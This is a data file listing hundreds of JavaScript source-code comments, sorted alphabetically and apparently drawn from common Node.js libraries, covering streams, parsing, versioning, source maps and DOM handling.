"// parallelized unpack ops may mess with one another, due to dependencies"
"// parentheses when reprinted, then return false to skip reprinting"
"// parse a 512-byte header block to a data object, or vice-versa"
"// parse badly indented code incorrectly, so **don't** use it as"
"// parse(type, input, options);"
"// parse5 treats template elements specially, assuming you return an array whose single item is the document fragment"
"// parseFloat NaNs numeric-cast false positives (null|true|false|"""")"
"// parsed mapping coordinates from the source map's ""mappings"" attribute. They"
"// parsedTypeCheck(parsedType, input, options);"
"// parsedTypeParse(parsedType, input, options);"
"// parser stream is done, and ready to have more stuff written to it."
"// parsing contains a |GroupName|, reparse with the goal symbol"
"// parsing rules -- if we're down here, then none of those matched and"
"// part (semicolon immediately after the opening parenthesis), it"
"// part of a method, or nothing in the case of shorthand"
"// partial character, the character's bytes are buffered until the required"
"// pass element metadata to url (value, text)"
"// pass.  Similarly, <=7.x is actually <8.0.0, etc."
"// passed in one, but it's not the right one."
"// passed, the full `{line, column}` locations of the start and"
"// path is an absolute URL, and the proxied URL's host is put in the header"
"// path might contain spaces, so convert those to %20"
"// path.getName(), assuming path is the parameter name."
"// path.name is not an array index, let path.value become the new"
"// path.parentPath.value, because the elements array is not a"
"// path.resolve([from ...], to)"
"// path: this.path + name,"
"// pedantic tests (`""use strict""; 010;` should fail)."
"// perfectly valid pattern that is equivalent to `[a-b]`, but it would"
"// perfectly valid pattern that is equivalent to `[a-b]`, but it"
"// performant to maintain the sorting as we insert them, rather than as we"
"// permission from the author, Mathias Buus (@mafintosh)."
"// persons to whom the Software is furnished to do so, subject to the"
"// pfx: fs.readFileSync(pfxFilePath),"
"// pipe is supported, and it's readable/writable"
"// plus the spec, which show how multiple nested scopes are technically required. We won't implement that"
"// points before the last delimiter, or `0` if there is none, then copy"
"// points to. Because the mappings are sorted, we can use binary search to"
"// possible ""dead code elimination"" optimization."
"// possible ""dead core elimination"" optimization."
"// possible values: 'dots', 'progress'"
"// power of 2, to prevent increasing it excessively in tiny"
"// pre-order, post-order, or both!"
"// precompute ""00"" to ""FF"""
"// prefer to return the chmod error, if one occurs,"
"// prefix fits in prefix, but path doesn't fit in path"
"// preminor will bump the version up to the next minor release, and immediately"
"// preservePaths:true, or else it will have been stripped)."
"// preventing lstats, and it's not the end of the world if we get a false"
"// previously exist), using any options set in the config."
"// previously, and it is no longer going to be a directory, and neither"
"// printable characters (normalized to `Unidentified`), ignore it."
"// probably just missing a ""type"" field (because Esprima does not"
"// processing instruction, e.g. <?php ?>"
"// properties), so we null out that information to prevent"
"// properties, so if we wrap it to ignore our secret keys, there should be"
"// property, i.e., returning the value rather than the getter"
"// property, it may be the creator of the child that's responsible for"
"// protocol"");"
"// prototypally inherits from Readable, and then parasitically from"
"// punctuation marks, numbers and English text in the text."
"// push.apply(_, arraylike) throws on ancient WebKit"
"// qSA looks outside Element context, which is not what we want"
"// quasi element, in case the parser accidentally decided to include it."
"// quasi elements, since some parsers accidentally include them."
"// queryValue is an object of this form: { $comparisonOperator1: value1, ... }"
"// r != q, this != m.  q or r may be null."
"// r = ""x^2/R mod m""; x != r"
"// r = ""xy/R mod m""; x,y != r"
"// r = x*y mod m; x,y != r"
"// raises(dom::DOMException, LSException);"
"// random [n, m]"
"// random(pwd, data) {"
"// rather than make the css module depend on the offset module, just check for it here"
"// re-definitions, such as the one in the Domain module (lib/domain.js)."
"// re-used for later invocations; so, we always have to copy that one."
"// reached the expected EOF, without any null buffer to append."
"// read it all, truncate the array."
"// read it all, truncate the list"
"// readable event, and the user called read(largeNumber) such that"
"// reading, then it's unnecessary."
"// real-world perfect, so let's fallback."
"// really need to keep your anchors, double them (i.e., `^^...$$`)"
"// reason.message === ""promise2"" because promise 2 became rejected before"
"// recast.parse and recast.print, but the Printer doesn't need (and"
"// receive an ""ENOTMODIFIED"" response:"
"// reduce only has a series version, as doing reduce in parallel won't"
"// referenced as the ""underscore"" module."
"// referenced by owner components, but"
"// references for the original function node, so we can safely"
"// reflink, nolink"
"// regression, see https://github.com/substack/node-optimist/issues/71"
"// regular expression used to skip single/nested brackets groups (round, square, curly)"
"// rel is a space-separated list of tokens, and the original rel types"
"// relies on the _id property being set, otherwise we have to use a quadratic algorithm"
"// remaining data and end the stream, if appropriate."
"// remove the ""data:"" scheme and parse the metadata"
"// renderNotes is run once, after all notes have saved."
"// rendering, in componentWillMount or componentDidMount, will be batched"
"// replace require(""./foo"") with the default export of foo"
"// replace require(""./foo"").bar with the named export from foo"
"// replies with 150, then a final reply after the data connection closes"
"// representation, we can drop this code path."
"// representation.  Err on the side of pruning, since all it's doing is"
"// representation. So if we do so, it breaks the script semantics."
"// request: { path | body, [host], [method], [headers], [service], [region] }"
"// res.body, res.headers, res.status"
"// reserve([list, of, paths], fn)"
"// resolve selectors; e.g. $(""<span>"").("".bar""), which otherwise loses ._root"
"// respectively. Instead of using expandos on components, we should be"
"// response code, then we can re-play the ""data"" events on the socket once the"
"// response was successful, if JSON passed validation"
"// response.resume should be defined, but check anyway before calling. Workaround for browserify."
"// result -> ['2', '3', '4']"
"// result === ""promise 2"" because it was resolved before promise1"
"// result in the error ""Could not complete the operation due to error c00c023f"""
"// result is [1, 4, 9]"
"// result is [NaN, NaN, NaN]"
"// result is equal to {a: 2, b: 4, c: 6}"
"// result is now a map of stats for each file, e.g."
"// result is now equal to [2, 4, 6]"
"// result is now equal to the last value of memo, which is 6"
"// results is now equal to ['one', 'two']"
"// results is now equal to: {one: 1, two: 2}"
"// results is now equals to: {one: 1, two: 2}"
"// ret == 1, don't bother squaring or multiplying it"
"// rethrown by a catch block, so their stacks will accurately"
"// return X64Word.create(high, low);"
"// return `function asenc(){ param ([Parameter(ValueFromPipeline)]$s) process{ Write-Host -NoNewline $s;}};`.replace(/\n\s+/g, '');"
"// return a ""request"" client object or an event emitter matching the same behaviour for unsupported protocols"
"// return array [""k1=v1"",""k2=v2""]"
"// return false if there's a queue, or if the current entry isn't flowing"
"// return function, invoking of which will abort this job"
"// return index of lowest 1-bit in x, x < 2^31"
"// return new, unset BigInteger"
"// return null, so we provide a flag to exit gracefully."
"// return this.putCookie(newCookie, cb);"
"// return true if dest is a subdir of src, otherwise false."
"// return""asdf"" with e.g. a literal null expression, we run"
"// returns [root, stripped]"
"// returns false for [], /./, new Date, and null."
"// returns the string ""198.95.249.79""."
"// reusing the original source, but with identical AST structure."
"// same reset, invokeVisitorMethod, and traverse function objects."
"// satisfies(v, range, options)"
"// save the methods so we can overwrite them later, if we need to."
"// saved, or something like that."
"// scenarios. For example, `[\u{1044f}-\u{10440}]` is an invalid"
"// schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex"
"// scheme must denote a ""secure"" protocol"""
"// script and fires only keydown, keypress, keyup. Catching keyup usually"
"// searchPop.attachEvent(""onBeforeHide"", function(type, ev, id){   return false;"
"// see above, log error but continue execution"
"// seems to be doing so, then the only way we can ignore this problem"
"// selected: true,"
"// selection (this matches native `select` event behavior). In HTML5, select"
"// self.on('pipe', function () {"
"// semicolon, except when they are children of for loops."
"// send back value only, as expected"
"// serialize them, but the big O is the same either way."
"// serializing an opaque identifier returns ""null"""
"// set node.loc to null, indicating that the node's .loc information"
"// set to zero to require manually dismissal, otherwise hides on its own"
"// setTimeout(client.get.bind(client, filepath, onfile), 10);"
"// setter void (unsigned long index, type value);"
"// setting a boolean content attribute,"
"// setting needle.originalColumn to 0, we thus find the last mapping for"
"// shortcut interface (item, callback)"
"// should be set to the appropriate BIND_* constant, like BIND_VAR or"
"// should call callbacks on refresh event (resize, etc)"
"// should pass printRootGenerically instead of print, to avoid"
"// shouldn't execute the callbacks until the next render happens, so"
"// significant bit first."""
"// similar; before our own UPDATE_QUEUEING wrapper closes, we want to run"
"// simpler class abstractions, we set them up after the fact."
"// simply start parsing an expression, and afterwards, if the"
"// since _read has to be called to start processing a new chunk.  However,"
"// since config actually uses setDriver which is async,"
"// since it never identifies a charset by itself. Instead, the pointer to the"
"// since it's used with createClass. If it's not, then it's likely a"
"// since results may be object, we must use counters"
"// since sends are inherently asynchronous, socket write failures will *not* be"
"// since that's the earliest that a buffer overrun could occur.  This way, checks are"
"// since we're dealing with an unsigned offset plus an unsigned size,"
"// size of the specific type, otherwise an exception is raised."
"// skip [ ], ( ), { } brackets groups"
"// skip if there is no :, or if it is the first/last character"
"// so $(""p:first"").is(""p:last"") won't return true for a doc with two ""p""."
"// so if it's 9 characters, then adding 1 for the 9 makes it 10"
"// so use ""detach"" method as fast way to get rid of the element"
"// so we allow it only if we don't know what the parent is, as all other"
"// so, on windows, and only on windows, we replace all \ chars with /,"
"// socket, otherwise if we're already connected (because this is a"
"// some bits pass through, and others are simply ignored.  (That would"
"// something other than serialized JSON), we can just return it and be"
"// something that can be bound, or assigned to. In order to do so, they perform"
"// something with the data.  Sometimes it's called a ""filter"","
"// somewhat reasonable, and if the scheme is missing, it is added."
"// sorting in C++. By using our own JS-implemented Quick Sort (below), we get"
"// source (valid, but why??). See github issue #199 and bugzil.la/1188982."
"// source file has not been modified since last time it was requested,"
"// source map, instead we assume that any consumer who does not"
"// spaces, for instance (\u3000) are not recorded correctly."
"// spaces, make this option true."
"// spec says ""exercise to the reader"", chrome says ""file://"""
"// special marker (SERIALIZED_MARKER, defined above), we will extract"
"// special visibility type (image, fixed)"
"// specific writer, then it would cause it to never start"
"// split last, right most, selector group token"
"// split the URI up into the ""metadata"" and the ""data"" portions"
"// stages of Document initialization, there is no documentElement present yet."
"// start char code for ""A"""
"// start with HAR, then override with additional options"
"// start with. Many are trivial to parse, some require a bit of"
"// starting at the head of the file, read a Header"
"// statement (e.g. a function expression or object literal), and it"
"// statement or expression, disallowing the `in` operator (see"
"// statements, and wraps them in a Program node.  Optionally takes a"
"// steps."""
"// store a reference to the ""redirects"" Array on the Response object so that"
"// str.replace(/\/+$/, '') for strings ending with a lot of / chars and"
"// stream classes.  When you write(chunk), that calls _write(chunk,cb)"
"// stream.promise().then(() => done, er => emitted error)"
"// strict mode pragma, execute code by injecting a"
"// strict mode, init properties are also not allowed to be repeated."
"// strict mode, using arguments when IsSimpleParameterList is true"
"// strict mode, using eval when IsSimpleParameterList is false"
"// strict mode, using eval when IsSimpleParameterList is true"
"// strict""` declarations when `allowStrict` is true (used for"
"// string into a JS object. If result isn't truthy, the key"
"// string into a JS object. If result isn't truthy, the"
"// string rather than a number, so we use loose equality checking here."
"// string), and append it to the title element created in the previous step."
"// string, don't set the property"
"// string; this is interpreted as ""the machine from which the URL is"
"// strip the trailing "":"" if present"
"// structures is adapted from ES 5.1 section 15.12.3, abstract operation `JO`."
"// structures, ensure those nodes are properly removed."
"// style object but the events that fire will still be prefixed, so we need"
"// subject to Annex B semantics (BIND_FUNCTION). Otherwise, the binding"
"// substeps:"""
"// such a pathological inflating mechanism, there'd be no way to tell"
"// such as the repl.  Also, if the push() triggered a"
"// sunos lets the root user unlink directories, which is... weird."
"// super, those expressions will implicitly depend on the"
"// supertypeList, *without* the typeName itself as the first element."
"// support drops, we can just export the realZlibConstants object."
"// support once('readable', fn) cycles. This means that calling"
"// support only one key and one value, but with .field(...) we can pass"
"// supports full value, key, callback (shortcut) interface"
"// supports short notation, e.g. ""9"" instead of ""9.0.0"""
"// suppress atime, ctime, uid, gid, uname, gname"
"// surrogate. In that case, we need to wait for the next two bytes in order to"
"// switch first dispatches on the lengths, to save on comparisons."
"// switch syntax RE, true to use Level 3, false to use Level 2"
"// symbolic link is encountered, because 8.3 filenames are impossible"
"// syntactic elements, and recursively calling those, each function"
"// synthetic after-write logic, where drain/finish live"
"// synthetic stream cases, such as passthrough streams, _read"
"// t.equal(String(foo), Symbol.prototype.toString.call(foo), 'Symbol#toString equals String of the same symbol');"
"// tags, English characters, numbers, low-ASCII punctuation characters, spaces"
"// task.arguments is an array-like object on which adding a new field doesn't work, so we transform it into a real array"
"// technically be optional in the Esprima AST format, but it must be"
"// tee gets 'foo', pipes to both locations"
"// temp += data[i].count ? (' <span class=""_right pull-right badge"">' + (data[i].count || '') + '</span>') : '';"
"// tests are complete, output some stats"
"// text, icon, disabled, action, submenu"
"// text: `${conf[_]['type']}:\/\/${conf[_]['user']}@${conf[_]['host']}`,"
"// textareas, replacing ""^\n"" with ""\r\n"" doesn't get eaten, and the first"
"// th position of the comma as an offset, and if `locations` is"
"// than 0, and the error is EINVAL or EPERM, then just ignore"
"// than characters, and because operator parsing has been inlined"
"// that Readable wants before the first _read call, so unset the"
"// that causes it, under certain circumstances, to provide the same value for"
"// that context. In fact, it's worse; see"
"// that created the element, and it may not even be a constructor."
"// that no subtyping is considered; so, for instance, isObject.check"
"// that takes ""flat"" options (not to be deep extended)"
"// that the Readable class should behave improperly, as streams are"
"// that was previously generated. Nevertheless, we return a new"
"// that, because it doesn't matter."
"// that.searchForm.attachEvent(""onButtonClick"", function(){   searchPop.hide();"
"// the ""relaxed"" mode, see:"
"// the .ctor export, contains common logic for dealing with arguments"
"// the AST instead of letting the exception propagate, so that"
"// the CONNECT response, so that if the response is anything other than an ""200"""
"// the ReadableState constructor, at least with V8 6.5"
"// the WritableState constructor, at least with V8 6.5"
"// the XRegExp class inside the module. This does nothing in the browser, where XRegExp is already"
"// the `https` module passed in from the ""http.js"" file"
"// the `loc` object, which holds line/column data. To also add a"
"// the actual Unicode character (by Babel, for example)."
"// the amount of time between when we first tried, and when we last tried"
"// the array is put in sorted order, and it will not need to be moved"
"// the array, excluding the last N. The **guard** check allows it to work with"
"// the browser, add `_` as a global object via a string identifier,"
"// the callback should be called with a ""request"" response object or an event emitter matching the same behaviour too"
"// the callback that the user supplies to write(chunk,encoding,cb)"
"// the callback that's passed to _write(chunk,cb)"
"// the caller, so it is assumed to be safe.  Thus, a call to write() may, in the extreme"
"// the comment size is encoded in a 2-byte field in the eocdr, which we can't find without trudging backwards through the comment to find it."
"// the dep in the nearest ""deps"""
"// the driver option is used, try setting it"
"// the empty string, as if the attribute were missing."
"// the end of the given buffer. If so, it sets this.charLength to the byte"
"// the final ""%c"" is somewhat tricky, because there could be other"
"// the first API call (e.g. `getItem`, `setItem`)."
"// the first and last statements, respectively, excluding any comments"
"// the form is iso-8859-1, or when the submitted form has an accept-charset"
"// the functions will simply let the function(s) below them parse,"
"// the given line, provided such a mapping exists."
"// the input might not even be in a form, let's just use the global"
"// the localforage module and force it to reload before each test, so that"
"// the location of the error, attaches the position to the end"
"// the maximum encodable as a null-terminated octal, by field size"
"// the next four bits are the actual value, and the 6th bit is the"
"// the null set is a subset of everything, but null simple ranges in"
"// the one we are searching for. However, there may be more than one such"
"// the override mistake, that accessor's getter is marked with"
"// the path.needsParens() && !hasParens(oldNode) check below, the"
"// the position of the comma as an offset, and if `locations` is"
"// the read buffer, and will cause it to emit 'readable' if necessary."
"// the results array will equal ['one','two'] even though"
"// the risk of ending up with returnnull, so we need to add an"
"// the rules associated with node.type, and default field values"
"// the same row."""
"// the second parameter to `parseExpression`), and then check"
"// the source map URL to SourceMapConsumer, so that this function"
"// the source root, if the source root is absolute. Not doing this would"
"// the start of the original subtree for this reprinting, then"
"// the state of the read buffer, providing enough data when"
"// the state of the tree to be corrupted, `node` here can be null."
"// the subkey can be broken into 8 values scaled to 32-bits,"
"// the superagent exports object - extent Request with ""proxy"""
"// the technique outlined above, which uses different, nesting"
"// the token, so that the next one's `start` will point at the"
"// the un-prefixed ""animation"" and ""transition"" properties are defined on the"
"// the user agent SHOULD ignore the cookie-av entirely."""
"// the validation flag non-enumerable (where possible, which should"
"// the value is an array, it should produce a URI like /Table/(4,5,8) and store.get() should handle that as an array of values"
"// the window, with the appropriate `this`."
"// their constructor, initially set to null. Then, successful loading of the stylesheet object would set it to"
"// their own traversal needs, and we should not complain if"
"// them from input."""
"// them is expensive, so we only want to do it if we must."
"// them, the content type is always null."
"// then 'complete'. The UA check is unfortunate, but not sure how"
"// then remove the whole classname (if there was one, the above saved it)."
"// then the path should be PaxHeader + basename, but less than 99,"
"// then this isn't a subset.  eg >=1.2.3-pre is not a subset of >=1.0.0,"
"// then we know this isn't a subset, but if EVERY simple range was null,"
"// there already.  If so, then hooray!  If not, then something"
"// there is no native function for this, because we can't actually store 64-bit integers precisely."
"// there isn't any inspectable ""Arguments"" type."
"// there to be a valid token after >, it needs to know whether to"
"// these are treated specially, and re-emitted"
"// these hoops because there can be many thousands of mappings, and parsing"
"// they are parsed, but skipped when unpacking"
"// they are replaced by the driver, which happens as soon as it loads."
"// thin air on IE8, this only happens if there is no visible text"
"// this = -b, so infinity"
"// this == b, so double"
"// this callback will be executed multiple times, the first is when server"
"// this can emit finish, and it will always happen"
"// this can emit finish, but finish must"
"// this case, a date like 01/01/13 02:23 could be detected instead of"
"// this code block is conditional.  However, it's preferable to pass"
"// this does not work for XML namespaced attributes,"
"// this does nothing, unless overwritten in IncomingForm.parse"
"// this generally means that it was not a valid range, which is allowed"
"// this hackery is required for IE8/9, where"
"// this is IE 8, which has a broken gOPD"
"// this is a very hot path, and fully deterministic."
"// this is needed to account for ""in"" vs ""hasOwnProperty"""
"// this is to prevent shammed Symbols, which are stored as strings, from being included in the string key section"
"// this is usually called on the first write(), end() or on nextTick()"
"// this isn't actually relevant for versions, but keep it so that we"
"// this logic is optimized to support for await loops,"
"// this looks simpler, and is strictly *faster*, but will"
"// this point we already have an error, don't need another one"
"// this rarely-used (in my experience) part of the API, but it can seem"
"// this returns false and buffers, then writes to p2 on next tick (1)"
"// this splits on whitespace, but keeps quoted and parened parts together"
"// this subtree. An assertion will fail if you forget, which is"
"// this table is modified base on win1251BulgarianCharToOrderMap, so"
"// this throws a TypeError, but we will just return undefined."
"// this will defer sometimesAsync's callback if necessary,"
"// this.Context.prototype object, but those prototypes can all use the"
"// this._abortRequested was set to true, return the root of"
"// this.abort(), which throws a special exception (instanceof"
"// this.checkArray=new Array(""iconUncheckAll.gif"",""iconCheckAll.gif"",""iconCheckGray.gif"",""iconUncheckDis.gif"",""iconCheckDis.gif"",""iconCheckDis.gif"");this.radioArray=new Array(""radio_off.gif"",""radio_on.gif"",""radio_on.gif"",""radio_off.gif"",""radio_on.gif"",""radio_on.gif"");this.lineArray=new Array(""line2.gif"",""line3.gif"",""line4.gif"",""blank.gif"",""blank.gif"",""line1.gif"");this.minusArray=new Array(""minus2.gif"",""minus3.gif"",""minus4.gif"",""minus.gif"",""minus5.gif"");this.plusArray=new Array(""plus2.gif"",""plus3.gif"",""plus4.gif"",""plus.gif"",""plus5.gif"");this.imageArray=new Array(""leaf.gif"",""folderOpen.gif"",""folderClosed.gif"");this.cutImg=new Array(0,0,0);this.cutImage=""but_cut.gif"";"
"// this.doc.COMMENT_NODE,"
"// this.doc.PROCESSING_INSTRUCTION_NODE,"
"// this.doc.TEXT_NODE,"
"// this.gid, entry.gid, this.processUid"
"// this.stack, and always a String."
"// those cases, we want to sanitize it to x/y/z/a, not z/a, so we strip /"
"// those types are now incorporated into ast-types, so this module doesn't"
"// though they are not absolute, so `c:../foo` becomes ['c:', '../foo']"
"// threaded through the walk, and can opt how and whether to walk"
"// throw away all buffered data, it's never coming out"
"// thus be captured by `keypress`, no other non-printable key should."
"// time, not the time between bytes sent by the server."
"// timeRange(hour1, hour2)"
"// timeRange(hour1, min1, hour2, min2)"
"// timeRange(hour1, min1, sec1, hour2, min2, sec2)"
"// timeline profiles in Chrome, for example."
"// to ""Hipster PDA App""."
"// to baseUrl, pull off the leading dot."
"// to be a valid token after >, it needs to know whether to look for a"
"// to be incremented up to the blockRemain level, as if we had expected"
"// to call noConflict to hide this version of jQuery, it will work."
"// to check if the un-prefixed events are usable, and if not remove them from the map."
"// to fix this to -0, the lowest possible prerelease value"
"// to get a null-padded file, and read it until the end.  then we will"
"// to group by, or a function that returns the criterion."
"// to illustrate usage, we'll create a utility function to request and pipe to stdout"
"// to key and input events on deletion, so we discard it."
"// to know when parsing a label, in order to allow or disallow"
"// to mangled selector strings like ""+div"" or ""ul>"""
"// to missing dependency), remove it."
"// to normalize all kinds of whitespace, so e.g. newlines (and unicode versions of it) can't sneak in"
"// to produce a full chunk, then immediately received an"
"// to reason about this code, so it should be split up in the future."
"// to reason about, and collisions are hazards rather than just failures."
"// to recast.print as options.inputSourceMap, the old source map will"
"// to the `names` array, until no new names were added in the iteration."
"// to the same document, sort order is unspecified."
"// toType(null), but it has the additional advantage of allowing"
"// toastr.error(LANG[""database""]['bookmark']['edit'][""name_invalid""],"
"// toastr.error(LANG[""filemanager""]['bookmark']['edit'][""name_invalid""],"
"// toastr.error(LANG[""shellmanager""]['body']['edit'][""name_invalid""],"
"// token ABNF, so only token characters are valid."
"// tokenChars[34] === 0 // '""'"
"// tokenizer got confused, and we force it to read a regexp instead."
"// tokens array is empty, we attach comments to tree as 'leadingComments'"
"// top-level render calls, so I'm abstracting it away into"
"// top: e.pageY - 20 - autoH,"
"// total file size, may be missing"
"// trailing edge, the system time has gone backwards and we're treating"
"// translates it to FEFF, the UTF-16 BOM."
"// translating an ES6 ""u""-flagged pattern to an ES5-compatible"
"// transpiler, and the original source is probably a better indicator of the"
"// traversal, but caching is difficult to do correctly without using a"
"// true if both NaN, false otherwise"
"// true to allow CSS escaped identifiers, false to disallow"
"// true to enable caching of result sets, false to disable"
"// true to follow HTML5 specs handling of "":checked"""
"// true to print console errors or warnings, false to mute them"
"// true to throw exceptions, false to skip throwing exceptions"
"// try again, with the same exact callback as this one."
"// try both, falling futimes back to utimes"
"// try calling apiMethod 3 times, waiting 200 ms between each retry"
"// try calling apiMethod only when error condition satisfies, all other"
"// try really hard to delete stuff on windows, because it has a"
"// try the MDTM command first, which is an optional extension command."
"// try to rmdir first, and only readdir on ENOTEMPTY or EEXIST (SunOS)"
"// turn the path into an expressoin; i.e., remove the position"
"// two (or more) holes, we need to write out two (or more)"
"// two numbers to output, in the same order."""
"// type d.type by calling methods such as d.bases, d.build, and d.field."
"// type, and if yes, consumes it as a side effect."
"// typeCheck(type, input, options);"
"// types.visit method, so you don't have to worry about"
"// unchanged, as in ""file:///c:/tmp/test.txt"".  In other cases, the"
"// undocumented cb() API, needed for core, not for public API"
"// unescape never throws, no try...catch needed:"
"// unescaped "" or '"
"// unguarded in another place, it seems safer to just disable JSHint for these"
"// unhandled errors will throw, since this is a proper node"
"// unicode fully, so we check for similarity on the maximally compatible"
"// unix absolute paths are also absolute on win32, so we use this for both"
"// unmatched surrogate; only append this code unit, in case the next"
"// unmounted, potentially)."
"// unstack, we are done"
"// until node has builtin pwnam functions, this'll have to do"
"// until someone asks for it, though."
"// up, but they are very rare. The resulting AST will be a mostly"
"// update README.md ""Serialization Format"" if you change this, please!"
"// updateCookie() may avoid updating cookies that are identical.  For example,"
"// updateQuery contains modifiers, use the find query as the base,"
"// updateQuery is a simple object with no modifier, use it as the document to insert"
"// usage would be .auth(accessToken, { type: 'bearer' })"
"// use hasOwnProperty to make sure contentWindow comes from the prototype,"
"// use matchKeyword('yield', false) and matchKeyword('yield', true)"
"// used to split comma groups excluding commas inside quotes '' """" or brackets () [] {}"
"// used w/ getLengthSync(), when length is known."
"// useful, so we don't use it."
"// uses .loc internally), pass true for this option."
"// using `['delete']()`, but we have a build step that"
"// using field values from the passed object. For fields missing from the passed object,"
"// usually it will add/modify request headers, but you can also sign the query:"
"// valid JavaScript AST (as per the [Mozilla parser API][api], except"
"// valid SourceLocation nodes, so we need to be more forgiving."
"// validate callback is a function, if provided"
"// validating, and parsing SemVer version strings."
"// value ""never"", reserved words and keywords can also not be"
"// value === 1, 2, 3"
"// value of `this`, even though they do not explicitly contain"
"// value, and has a chance to attach a 'drain' listener."
"// value, rather than using the problematic typeof operator. Note however"
"// value="""" should make a value attribute (#6219)"
"// values for the readable and the writable sides of the duplex stream,"
"// values of 0, instead of the minimum of 1."
"// values to be negative, which technically makes them no longer"
"// var URL = /^(?:(?:https?|ftp):\/\/)(?:\S+(?::\S*)?@)?(?:(?!10(?:\.\d{1,3}){3})(?!127(?:\.\d{1,3}){3})(?!169\.254(?:\.\d{1,3}){2})(?!192\.168(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u{00a1}-\u{ffff}0-9]+-)*[a-z\u{00a1}-\u{ffff}0-9]+)(?:\.(?:[a-z\u{00a1}-\u{ffff}0-9]+-)*[a-z\u{00a1}-\u{ffff}0-9]+)*(?:\.(?:[a-z\u{00a1}-\u{ffff}]{2,})))(?::\d{2,5})?(?:\/[^\s]*)?$/iu;"
"// var VALID_ENCODINGS = ['gb2312', 'gbk', 'utf-8', 'big5', 'euc-kr','euc-jp'];"
"// var a = function(param1)  {return param1;}; function FooClass(){""use strict"";}"
"// var parser = new Parser(handler[, options]);"
"// var window_test = windows.createWindow('window_test' + (+new Date), 0, 0, 600, 400);"
"// verify luhn, adapted from  <https://gist.github.com/2134376>"
"// verify that that's the case. (Strictly speaking, unmounting won't cause a"
"// vertical bar (""|"") for the colon after the drive letter, yielding"
"// visit it if the visitor defines visitBlock or visitLine, and"
"// visitor method, it's up to you whether your traversal is"
"// void set(TypedArray array, optional unsigned long offset);"
"// void set(sequence<type> array, optional unsigned long offset);"
"// w/ a known file a size, and not wanting to wait for"
"// walker, and state can be used to give this walked an initial"
"// was intended, the left tag can be wrapped in parentheses.)"
"// watermarks determine how many objects to keep in the buffer, rather than"
"// way, it'll receive the node for `x[1]` already parsed, and wraps"
"// we can guarantee we have that here, because we control the"
"// we can ignore everything in base after the last slash of its path component,"
"// we can't use bitshifting here, because JavaScript bitshifting only works on 32-bit integers."
"// we have enough to cover it, but it spans past the first buffer."
"// we have implemented the _read method, and done the other things"
"// we know it doesn't have an entry, because that got checked above"
"// we know patch is an x, because we have any x at all."
"// we know that we are in CONSUMING mode, so anything written goes into"
"// we need to capture the wall-clock start time (via Date), immediately followed"
"// we needed a prerelease range in a specific tuple, but didn't get one"
"// we prevent ""Stack overflow"" error in IE7"
"// we really want the negative inverse, and -DV < y < DV"
"// we run the entire test suite (except for config tests), but undefine"
"// we search backwards for a eocdr signature, and hope that whoever made the zip file was smart enough to forbid the eocdr signature in the comment."
"// we wait for the next tick, because it might"
"// we'll catch any overflow errors, because we already made sure the total file size was within reason."
"// weird, but happens."
"// were in the request, so if this passes we're good."
"// were not matched by the parse, or if any Early Error conditions exist."
"// were read, the integer value otherwise. When `len` is given, this"
"// what little evidence I could find, it seems that its general directionality"
"// what the next least recently used key will be, so just"
"// what to match against with search selection (both, text, or label)"
"// when end() has been called, and returned"
"// when matching a possible boundary, keep a lookbehind reference"
"// when parsing properties), it will also convert keywords into"
"// when piping, we only care about 'readable' events that happen"
"// when the dest drains, it reduces the awaitDrain counter"
"// when the writable side finishes, then flush out anything remaining."
"// when we try to consume some more bytes, simply unpause the"
"// when...} \n	then\n		${3:// then...}\n	end\n\nsnippet query\n	query ${1?:query_name}\n		${2:// find} \n	end\n	\nsnippet declare\n	declare ${1?:type_name}\n		${2:// attributes} \n	end\n\n',t.scope=""drools""});                (function() {"
"// whenever selectedness is set to true, make sure all"
"// whenever we return null, then we set a flag to say"
"// where React won't take over (static pages), we can simply return"
"// where we need to convert ""\"" to ""/"" and add an extra ""/"" prefix before the"
"// wherever a Pattern is allowed, and the right-hand side represents a"
"// which is a comment of "" blah -- bloo """
"// which is weird BTW, because response.body won't be there."
"// which support attributes or a .getAttribute method, gracefully return"
"// which value to return, respectively either:"
"// whitespace and comments, and."
"// whitespace, identifier, and identifier-start categories. These"
"// whitespace, replace codepoints 0 with '\ufffd'"
"// width during animation, can be set to 'auto', initial', 'next' or pixel amount"
"// will be false, and we need to re-evaluate how much data we"
"// will be ignored by the interpreter, but if it ends with"
"// will be overridden if tag contails an xmlns=""foo"" or xmlns:foo=""bar"""
"// will be responsible for printing the ""declare"" token. Otherwise"
"// will change dramatically. To signal this, we wrap them into an opaque-ish"
"// will do f.call(obj, a, b, c, d)"
"// will get processed, now that we've asked for it."
"// will have occurred which will not be present in `markup`. Here,"
"// will not work with plain functions, since the parameter names will be"
"// will return `null`. If instead, the socket is paused, any possible buffered"
"// will throw an exception. In some old version V8, this is not the case"
"// will throw an exception. In some old version of V8, this is not the case"
"// windows will think that //x/y/z has a ""root"" of //x/y/"
"// with '<code>-', but many servers will do this."
"// with 0, 1, 2, 3"
"// with Object.prototype.hasOwnProperty.call), the same set of keys"
"// with a particular name, those instances need to be stored in a cache."
"// with comments, and then patch the resulting lines where"
"// with direct calls to dataPriv methods, these can be deprecated."
"// with just that many newlines, sans all other spaces."
"// with just that many newlines, with all other spaces removed."
"// with no source maps, generated is either an"
"// with the same tuple and a prerelease, or it's not a subset"
"// without a significant breaking change to either this  parser, or the"
"// without limitation the rights to use, copy, modify, merge, publish,"
"// without this settings, colors won't be shown"
"// without this, warn and skip .., relativize absolutes, and error"
"// works providing we're not in ""use strict"";"
"// works, but not when it is part of a labeled statement that is the sole"
"// would be consumed, and then the rest would wait (un-transformed) until"
"// would not be triggered on donor event, since in our own"
"// would return false, as no `_writableState` property is attached."
"// would return the string ""198.95.249.79"" if you were running the"
"// write to the database, likely due to the disk being full"
"// write() call, so we wait for the next drain to continue."
"// write(fd, buffer, offset, length, position, callback)"
"// written chunk would result in multiple output chunks, then the first"
"// written to it, then it needs more."
"// x. Let resolved be the result of PACKAGE_IMPORTS_EXPORTS_RESOLVE( specifier, pjson.imports, packageURL, true, conditions)."
"// x. Let resolved be the result of PACKAGE_TARGET_RESOLVE( packageURL, mainExport, """", false, false, conditions)."
"// x. Set mainExport to exports["".""]."
"// y. If resolved is not null or undefined, return resolved."
"// yep, we're already done"
